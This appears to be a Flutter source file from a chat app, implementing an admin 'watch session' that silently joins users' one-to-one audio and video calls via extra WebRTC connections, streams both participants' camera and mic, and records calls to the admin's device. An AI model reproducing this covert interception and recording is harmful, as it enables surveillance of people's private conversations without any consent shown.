import 'dart:async';
import 'dart:io';
import 'package:flutter/foundation.dart';
import 'package:flutter/material.dart';
import 'package:flutter_webrtc/flutter_webrtc.dart';
import 'package:intl/intl.dart';
import 'package:permission_handler/permission_handler.dart';
import '../config/call_config.dart';
import '../models/active_call_model.dart';
import 'call_service.dart';

/// Sesi admin memantau satu call 1:1 (audio/video) secara real-time.
///
/// Pola: admin jadi pihak ketiga PENERIMA. Tiap peserta call membuat peer
/// connection kedua ke admin (sinyal watch_request/watch_offer/watch_answer/
/// watch_candidate di tabel call_signals). Admin menerima stream kamera+mic
/// kedua peserta sekaligus — video tampil, audio kedua pihak terdengar
/// bersamaan. Sesi diikat ke layar monitor chat yang dibuka; saat layar
/// ditutup [stop] memutus semua koneksi (tidak bisa didengar lagi).
class WatchSession extends ChangeNotifier {
  final ActiveCallInfo call;

  WatchSession(this.call)
    : participants = [
        WatchParticipant(uid: call.callerId, name: call.callerName),
        WatchParticipant(uid: call.calleeId, name: call.calleeName),
      ];

  final List<WatchParticipant> participants;
  final CallService _service = CallService.instance;
  StreamSubscription<Map<String, dynamic>>? _sub;
  Timer? _requestTimer;
  Timer? _statusTimer;
  bool _stopped = false;
  final Map<String, List<Map<String, dynamic>>> _pendingCands = {};

  bool get isVideo => call.callType == 'video';
  bool get stopped => _stopped;

  /// Peserta yang jadi video utama (index di [participants]).
  int mainIndex = 0;

  Future<void> start() async {
    if (_stopped) return;
    try {
      await Helper.setSpeakerphoneOn(true);
    } catch (_) {}
    for (final p in participants) {
      try {
        await p.renderer.initialize();
      } catch (_) {}
    }
    // Sinyal call ini — semua sinyal peserta diterima admin karena
    // from_uid != uid admin.
    _sub = _service.onSignal(call.id).listen(_onSignal);
    _requestAll();
    // Ulangi permintaan sampai tiap peserta menjawab (callee belum accept
    // belum punya media/session → baru merespon setelah call diterima).
    _requestTimer = Timer.periodic(
      const Duration(seconds: 3),
      (_) => _requestAll(),
    );
    // Deteksi call berakhir → tutup otomatis.
    _statusTimer = Timer.periodic(const Duration(seconds: 5), (_) async {
      if (_stopped) return;
      try {
        final row = await _service.getCall(call.id);
        final st = row?['status'] as String?;
        if (st == 'ended' ||
            st == 'canceled' ||
            st == 'declined' ||
            st == 'missed' ||
            st == 'busy') {
          await stop();
          notifyListeners();
        }
      } catch (_) {}
    });
  }

  void _requestAll() {
    if (_stopped) return;
    for (final p in participants) {
      if (p.connected) continue;
      _service.sendSignal(call.id, 'watch_request', payload: {'from': myUid});
    }
  }

  String? get myUid => _service.uid;

  void _onSignal(Map<String, dynamic> msg) {
    if (_stopped) return;
    // Sinyal routing antar-peserta (to = uid peserta) bukan untuk admin.
    final to = msg['to'] as String?;
    if (to != null && to != myUid) return;
    switch (msg['type']) {
      case 'watch_offer':
        unawaited(_handleOffer(msg));
      case 'watch_candidate':
        unawaited(_handleCandidate(msg));
      case 'watch_state':
        _handleState(msg);
    }
  }

  Future<void> _handleOffer(Map<String, dynamic> msg) async {
    if (_stopped) return;
    final from = msg['from'] as String?;
    final sdp = msg['sdp'] as Map<String, dynamic>?;
    if (from == null || sdp == null) return;
    WatchParticipant? p;
    for (final cand in participants) {
      if (cand.uid == from) p = cand;
    }
    if (p == null) return;
    try {
      final old = p.pc;
      if (old != null) {
        try {
          await old.close();
        } catch (_) {}
      }
      _pendingCands.remove(p.uid);
      final pc = await createPeerConnection(await CallConfig.getPeerConfig());
      p.pc = pc;
      p.connecting = true;
      p.hasVideoTrack = false;
      pc.onTrack = (event) {
        if (_stopped) return;
        final stream = event.streams.isNotEmpty ? event.streams.first : null;
        if (stream == null) return;
        if (stream.getVideoTracks().isNotEmpty) p!.hasVideoTrack = true;
        p!.renderer.srcObject = stream;
        notifyListeners();
      };
      pc.onIceCandidate = (c) {
        _service.sendSignal(
          call.id,
          'watch_candidate',
          payload: {'candidate': c.toMap(), 'to': p!.uid, 'from': myUid},
        );
      };
      pc.onConnectionState = (state) {
        if (_stopped || p == null) return;
        p.connected =
            state == RTCPeerConnectionState.RTCPeerConnectionStateConnected;
        debugPrint('[ADMIN-WATCH] ${p.name} state=$state');
        notifyListeners();
      };
      await pc.setRemoteDescription(
        RTCSessionDescription(sdp['sdp'], sdp['type']),
      );
      for (final c in List<Map<String, dynamic>>.from(
        _pendingCands[p.uid] ?? const [],
      )) {
        try {
          await pc.addCandidate(
            RTCIceCandidate(
              c['candidate'] ?? '',
              c['sdpMid'],
              (c['sdpMLineIndex'] as num?)?.toInt(),
            ),
          );
        } catch (_) {}
      }
      _pendingCands.remove(p.uid);
      final answer = await pc.createAnswer();
      await pc.setLocalDescription(answer);
      await _service.sendSignal(
        call.id,
        'watch_answer',
        payload: {'sdp': answer.toMap(), 'to': p.uid, 'from': myUid},
      );
      p.connecting = false;
      // Status awal mic/kamera dikirim ikut offer — admin langsung tahu
      // kalau kamera peserta memang sudah off sejak awal.
      if (msg['micOn'] is bool) p.micOn = msg['micOn'] as bool;
      if (call.callType == 'video' && msg['cameraOn'] is bool) {
        p.cameraOn = msg['cameraOn'] as bool;
      }
      notifyListeners();
    } catch (e) {
      debugPrint('[ADMIN-WATCH] handle offer failed: $e');
      p.connecting = false;
      notifyListeners();
    }
  }

  Future<void> _handleCandidate(Map<String, dynamic> msg) async {
    if (_stopped) return;
    final from = msg['from'] as String?;
    final c = msg['candidate'] as Map<String, dynamic>?;
    if (from == null || c == null) return;
    WatchParticipant? p;
    for (final cand in participants) {
      if (cand.uid == from) p = cand;
    }
    if (p == null) return;
    try {
      final rd = await p.pc?.getRemoteDescription();
      if (rd == null) {
        _pendingCands.putIfAbsent(p.uid, () => []).add(c);
        return;
      }
      await p.pc?.addCandidate(
        RTCIceCandidate(
          c['candidate'] ?? '',
          c['sdpMid'],
          (c['sdpMLineIndex'] as num?)?.toInt(),
        ),
      );
    } catch (_) {}
  }

  void _handleState(Map<String, dynamic> msg) {
    final from = msg['from'] as String?;
    if (from == null) return;
    for (final p in participants) {
      if (p.uid != from) continue;
      if (msg['micOn'] is bool) p.micOn = msg['micOn'] as bool;
      if (call.callType == 'video' && msg['cameraOn'] is bool) {
        p.cameraOn = msg['cameraOn'] as bool;
      }
      notifyListeners();
    }
  }

  /// ── Rekam panggilan ke storage lokal admin ──
  MediaRecorder? _recorder;
  bool _recording = false;

  bool get recording => _recording;

  static String _safeName(String raw) {
    final s = raw.trim().replaceAll(RegExp(r'[\\/:*?"<>|]+'), '');
    return s.isEmpty ? 'Unknown' : s;
  }

  /// Folder tujuan sesuai tipe call:
  /// ChatYuk Admin/Record/Video (video) | ChatYuk Admin/Record/call (audio).
  Future<String> _recordPath() async {
    final dir = Directory(
      '/storage/emulated/0/ChatYuk Admin/Record/${isVideo ? 'Video' : 'call'}',
    );
    if (!await dir.exists()) await dir.create(recursive: true);
    final ts = DateFormat('yyyy-MM-dd_HH-mm-ss').format(DateTime.now());
    final names = '${_safeName(call.callerName)}_${_safeName(call.calleeName)}';
    return '${dir.path}/$names$ts.${isVideo ? 'mp4' : 'm4a'}';
  }

  /// Mulai rekam. Video call → mp4 (kamera peserta utama + audio keluaran
  /// kedua peserta). Voice call → m4a (audio keluaran saja).
  /// [onDone] dipanggil dengan path file setelah stop.
  Future<String?> startRecording() async {
    if (_recording || _stopped) return null;
    try {
      var granted = false;
      if (await Permission.manageExternalStorage.isGranted ||
          (await Permission.storage.request()).isGranted) {
        granted = true;
      } else {
        final m = await Permission.manageExternalStorage.request();
        granted = m.isGranted || m.isLimited;
      }
      if (!granted) return 'STORAGE_DENIED';
      final path = await _recordPath();
      final rec = MediaRecorder();
      final main = participants[mainIndex];
      MediaStreamTrack? vTrack;
      if (isVideo) {
        final st =
            main.renderer.srcObject ?? main.pc?.getRemoteStreams().firstOrNull;
        final tracks = st?.getVideoTracks() ?? const [];
        if (tracks.isNotEmpty && _showTrackAlive(tracks.first)) {
          vTrack = tracks.first;
        }
      }
      await rec.start(
        path,
        videoTrack: vTrack,
        audioChannel: RecorderAudioChannel.OUTPUT,
      );
      _recorder = rec;
      _recording = true;
      notifyListeners();
      debugPrint('[ADMIN-WATCH] recording -> $path');
      return path;
    } catch (e) {
      debugPrint('[ADMIN-WATCH] startRecording failed: $e');
      _recording = false;
      notifyListeners();
      rethrow;
    }
  }

  bool _showTrackAlive(MediaStreamTrack t) => t.enabled;

  /// Stop rekaman. Return path file hasil rekaman.
  Future<String?> stopRecording() async {
    if (!_recording) return null;
    final rec = _recorder;
    _recorder = null;
    _recording = false;
    notifyListeners();
    try {
      await rec?.stop();
    } catch (e) {
      debugPrint('[ADMIN-WATCH] stopRecording error: $e');
    }
    return null;
  }

  /// Tutup semua koneksi + renderer. Setelah ini admin tidak lagi
  /// menerima audio/video dari peserta.
  Future<void> stop() async {
    if (_stopped) return;
    _stopped = true;
    _requestTimer?.cancel();
    _statusTimer?.cancel();
    if (_recording) {
      try {
        await stopRecording();
      } catch (_) {}
      // Beri waktu encoder menutup file sebelum renderer dibuang.
      await Future.delayed(const Duration(milliseconds: 600));
    }
    await _sub?.cancel();
    for (final p in participants) {
      try {
        p.renderer.srcObject = null;
      } catch (_) {}
      try {
        await p.pc?.close();
      } catch (_) {}
      p.pc = null;
      try {
        await p.renderer.dispose();
      } catch (_) {}
    }
    _pendingCands.clear();
  }
}

/// Satu sisi peserta call yang dipantau.
class WatchParticipant {
  final String uid;
  final String name;
  final RTCVideoRenderer renderer = RTCVideoRenderer();
  RTCPeerConnection? pc;
  bool connecting = false;
  bool connected = false;
  bool micOn = true;
  bool cameraOn = true;
  bool hasVideoTrack = false;

  WatchParticipant({required this.uid, required this.name});
}
